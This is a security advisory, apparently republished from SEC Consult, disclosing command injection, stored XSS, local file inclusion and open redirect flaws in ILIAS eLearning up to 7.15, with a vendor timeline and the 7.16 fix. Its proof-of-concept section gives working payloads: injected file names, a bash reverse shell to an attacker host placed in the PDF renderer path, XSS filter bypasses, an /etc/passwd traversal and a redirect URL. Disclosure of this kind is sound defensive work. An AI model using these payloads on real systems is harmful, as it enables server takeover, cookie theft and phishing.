@@ -1,0 +1,218 @@
+id: 38100
+date: 12/10/2022
+title: ILIAS eLearning 7.15 Command Injection / XSS / LFI / Open Redirect Vulnerabilities
+author: Anna Hartig
+cves: CVE-2022-45915, CVE-2022-45916, CVE-2022-45917, CVE-2022-45918
+
+=======================================================================
+               title: Multiple critical vulnerabilities
+             product: ILIAS eLearning platform
+  vulnerable version: <= 7.15
+       fixed version: 7.16
+          CVE number: CVE-2022-45915, CVE-2022-45916, CVE-2022-45917,
+                      CVE-2022-45918
+              impact: critical
+            homepage: https://www.ilias.de
+               found: 2022-09-30
+                  by: Anna Hartig (Office Bochum)
+                      Constantin Schwarz (Office Bochum)
+                      Niklas Schilling (Office Munich)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Around since 1998, ILIAS is a powerful learning management system that fulfills
+all your requirements. Using its integrated tools, small and large businesses,
+universities, schools and public authorities are able to create tailored,
+individual learning scenarios."
+
+Source: https://www.ilias.de/en/
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch which should be installed immediately.
+
+SEC Consult highly recommends to perform a thorough security review of the product
+conducted by security professionals to identify and resolve potential further
+security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Authenticated Direct OS Command Injection - CVE-2022-45915
+ILIAS utilizes several third-party programs to perform tasks like creating PDF
+files or scanning uploaded files for known viruses. These are called using the
+PHP exec() function. In several instances, the arguments passed to the exec()
+function contain user input that is not properly sanitized.
+By performing malicious configuration steps or uploading dangerous files, an
+attacker can execute arbitrary system commands with the rights of the web server
+user (www-data).
+The privilege required for the different instances of command injection range
+from low rights to admin rights.
+
+
+2) Stored Cross-Site Scripting - CVE-2022-45916
+Multiple stored cross-site scripting vulnerabilities were identified in ILIAS
+course items. These were either achieved by bypassing existing XSS filters or
+simply by exploiting missing input validation altogether. This results in the
+execution of attacker-controlled JavaScript code by the user's browser.
+The attacker requires the right to create course items, e.g., as a tutor of a
+course.
+
+
+3) Local File Inclusion - CVE-2022-45918
+The included SCORM editor features a debugger that gives authors insights into
+the current SCORM player session, as well as previous sessions. When accessing
+the logs of previous sessions, the debugger fails to validate the requested
+file path, allowing for arbitrary filesystem access.
+
+
+4) Open Redirect - CVE-2022-45917
+The function shib_logout.php redirects the user to a URL specified in the
+"return" parameter. Since this parameter is not validated, an attacker can use
+it to redirect a victim to an arbitrary website. This is a powerful tool in
+phishing campaigns, as it allows hiding the malicious webpage behind a link that
+looks like it would take you to the real ILIAS webpage.
+
+
+Proof of concept:
+-----------------
+1) Authenticated Direct OS Command Injection - CVE-2022-45915
+Multiple instances of command injection vulnerabilities were identified:
+
+a) ZIP archive upload
+Normal users with open assessments can submit their solution by uploading a ZIP
+archive. These archives are extracted on the server and scanned for viruses
+recursively. The directory and file names can be used by an attacker to inject
+system commands, e.g., by including a directory with the name
+$(touch /tmp/pwned) to the ZIP archive. Exploiting this vulnerability, an attacker
+is able to get a reverse shell on the ILIAS webserver with the rights of the
+web server user (www-data).
+
+
+b) Media object creation
+ILIAS can be configured so that users can create media objects based on files
+inside an "Upload Directory". Before these objects are created, the files are
+scanned for viruses. The file names can be used by an attacker to inject system
+commands. By placing a file with a name like $(touch /tmp/pwned) inside the
+upload directory and then creating a media object based on it, an attacker is
+able to execute arbitrary system commands with the rights of www-data on the
+server.
+
+
+c) PDF document creation
+ILIAS provides users the functionality to export content as PDF files. A user
+with admin rights can configure the path to the preferred PDF renderer. An
+attacker can use this parameter to inject system commands. Due to missing
+input validation it is possible to inject multiple commands. The path to
+wkhtmltopdf has to be included in the payload, as ILIAS checks for it. By
+changing the path to:
+
+/usr/local/bin/wkhtmltopdf; bash -c "bash -i >& /dev/tcp/<IP_Address_Attacker>/13373 0>&1";
+
+an attacker can open a reverse shell with the rights of www-data that connects
+to the attacker's machine on port 13373. The reverse shell is initiated when
+the export function is triggered.
+No PDF renderer has to be installed for this vulnerability to be exploitable.
+
+
+2) Stored Cross-Site Scripting - CVE-2022-45916
+Multiple instances of stored cross-site scripting were identified:
+
+a) Several Stored XSS Attacks in Tests
+An attacker must be able to create new tests in which the JavaScript code will
+be embedded. If a victim then later accesses one of those tests, the XSS payload will
+be triggered. The "Question" input field of a test has a filter in place, which
+correctly removes HTML tags such as <script> or
+<img src="x" onerror="alert(document.cookie)">. By making use of half open HTML
+tags, this filter can be successfully bypassed. E.g.
+
+<img src="x" onerror="alert(document.cookie)"
+
+This half open HTML tag can also be used in the "Introductory Message" of a test
+to trigger an XSS. It's important to end the JavaScript code with a quotation
+mark or space, to properly separate it from successive HTML tags, after it's
+embedded into a test.
+
+Finally, the "Question" input field of the question type "Long Menu" was
+identified to use no filtering at all, resulting in the unrestricted use of
+arbitrary HTML tags such as <script>.
+
+
+b) Stored XSS in title of course items
+An attacker with rights to create an arbitrary course item can conduct a stored
+XSS attack by setting the title of the element to:
+
+" onclick="alert(document.cookie)"
+
+When a user clicks on the button to the right of the title, the XSS payload is
+triggered.
+
+
+c) Stored XSS in HTML sites
+An attacker with rights to edit an HTML Learning Module can conduct a stored
+XSS attack, as it is allowed to insert JavaScript Code to the HTML page. Even
+if this behavior is intended, it is insecure and considered bad practice.
+
+
+3) Local File Inclusion - CVE-2022-45918
+As a prerequisite, the SCORM debugger must be enabled for the whole ILIAS
+platform. An attacker with access to a SCORM player can open the SCORM
+debugger and request the logs of a previous session. By changing the value of
+the "logFile" query parameter of the request, they can read arbitrary
+files of the server's filesystem. For example, to read the passwd file
+on Linux systems, an attacker can change the value of the parameter logfile
+to "../../../../../../../../../etc/passwd".
+
+
+4) Open Redirect - CVE-2022-45917
+The shib_logout function is vulnerable to an open redirect.
+A URL that successfully uses this vulnerability to redirect to
+"https://www.sec-consult.com" is:
+
+http://ILIAS-URL/shib_logout.php?action=logout&return=https://www.sec-consult.com
+
+
+Vulnerable / tested versions:
+-----------------------------
+The vulnerabilities were identified in ILIAS version 7.14.
+However, a brief analysis of the source code suggests, that several
+vulnerabilities are present in versions dating back to at least 3.8.4.
+Hence it is assumed that most current versions of the product are affected.
+
+The vulnerabilities were partly fixed in version 7.15, a complete patch is
+available with version 7.16.
+
+
+Vendor contact timeline:
+------------------------
+2022-10-07: Contacting vendor through security@lists.ilias.de
+2022-10-19: Sending initial email again, as the vendor did not yet respond
+2022-10-25: Extending email recipients to info@ilias.de, datenschutz@ilias.de and
+             identified personal email addresses from the vendor's website.
+2022-10-25: Sending the advisory to the provided contact
+2022-10-31: Vendor requests more information
+2022-10-31: Sending detailed PoC
+2022-11-10: Asking for current status
+2022-11-22: Vendor confirms that patches will be available by 2022-11-26
+2022-11-22: Asking about the version numbers of mentioned patches and CVE IDs
+2022-11-23: Vendor provides information about patched versions; CVE IDs will be
+             requested by SEC Consult
+2022-11-24: Vendor releases patched version 7.16
+2022-12-06: Public release of security advisory
+
+
+Solution:
+---------
+Update ILIAS to version 7.16 or newer from the vendor's website:
+https://docu.ilias.de/goto.php?target=st_229
+
+#  0day.today [2023-03-27]  #
